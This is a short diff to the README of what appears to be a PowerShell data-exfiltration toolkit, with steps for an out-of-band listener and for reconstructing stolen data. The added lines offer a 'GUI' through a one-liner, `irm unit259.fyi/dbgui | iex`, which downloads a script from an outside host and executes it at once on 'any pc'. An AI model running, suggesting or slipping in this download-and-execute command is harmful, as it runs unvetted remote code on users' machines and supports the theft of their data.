@@ -43,6 +43,9 @@ Processes data received from `exfil.ps1`, finding patterns in logs, assembling d
       - provide url for OOB Lister
       - provide filepath of target exfil data
 
+      You have the option of using our GUI as well. The following one liner will open it on any pc for you instantly. 
+      `irm unit259.fyi/dbgui | iex`
+
 2. **Data Reconstruction with `recreate.ps1`**:
       - provide regex key
 
